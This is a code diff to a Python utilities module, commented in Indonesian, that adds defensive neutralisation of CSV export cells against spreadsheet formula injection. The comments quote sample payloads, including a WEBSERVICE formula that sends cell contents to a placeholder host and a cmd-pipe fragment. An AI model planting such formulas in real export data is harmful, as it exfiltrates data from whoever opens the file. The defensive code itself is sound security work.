@@ -2,6 +2,7 @@
 Shared utilities used across route modules.
 Cache, audit logging, thumbnail generation, OTP, constants, limiter.
 """
+import re
 import os
 import io
 import sys
@@ -737,6 +738,52 @@ async def send_esign_email(email: str, nama: str, judul: str, link: str,
         if lk:
             await catat_kuota_email_tercapai(lk, str(e))
         return False
+
+
+# --- Netralisasi sel ekspor (injeksi formula) ---
+# Berkas ekspor AMAN dikirim keluar: ke KPKNL, ke auditor, ke satker lain.
+# Yang membukanya adalah Excel/LibreOffice di komputer ORANG LAIN — jadi risiko
+# ini berpindah tangan, bukan tinggal di server kita.
+#
+# Excel memperlakukan isi sel yang diawali `=`, `+`, `-`, `@`, tab, atau CR
+# sebagai RUMUS, dan itu tetap berlaku meski selnya dikutip di CSV. Satu nilai
+# seperti `=WEBSERVICE("https://x/?d="&A2)` di kolom Supplier berubah menjadi
+# rumus hidup yang menarik isi sel lain lalu mengirimkannya keluar.
+#
+# Untuk XLSX cukup mematikan `strings_to_formulas` di tingkat workbook. CSV
+# tidak punya sakelar seperti itu — teksnya harus dinetralkan sendiri.
+_AWALAN_BERBAHAYA = ("=", "+", "-", "@", "\t", "\r")
+
+# Angka biasa DIKECUALIKAN. Tanpa pengecualian ini setiap nilai negatif
+# (mis. koreksi nilai perolehan "-1500000") ikut berawalan kutip dan berubah
+# jadi teks di Excel — kolom yang seharusnya bisa dijumlahkan auditor jadi
+# rusak. Yang berbahaya adalah `-1+1+cmd|...`, bukan `-1500000`.
+_POLA_ANGKA = re.compile(r"^[+-]?\d+(?:[.,]\d+)?$")
+
+
+def netralkan_sel_csv(nilai) -> str:
+    """Nilai apa adanya, dengan kutip tunggal di depan bila Excel akan
+    membacanya sebagai rumus.
+
+    Kutip tunggal adalah penanda "perlakukan sebagai teks" milik Excel sendiri:
+    ia TIDAK ikut tampil di sel, hanya terlihat di formula bar. Jadi tampilan
+    bagi pembaca tetap sama, tetapi rumusnya mati.
+    """
+    s = "" if nilai is None else str(nilai)
+    if s[:1] in _AWALAN_BERBAHAYA and not _POLA_ANGKA.match(s):
+        return "'" + s
+    return s
+
+
+def sel_csv(nilai) -> str:
+    """Satu sel CSV siap pakai: dinetralkan, lalu dikutip dengan benar.
+
+    Kutip di dalam nilai DIGANDAKAN (aturan CSV), bukan ditukar jadi apostrof.
+    Penukaran diam-diam mengubah data pengguna: aset bernama `Meja "Jati"`
+    dulu terekspor sebagai `Meja 'Jati'` dan perubahan itu tak pernah bisa
+    dikembalikan saat diimpor ulang.
+    """
+    return '"' + netralkan_sel_csv(nilai).replace('"', '""') + '"'
 
 
 # --- Audit Logging ---
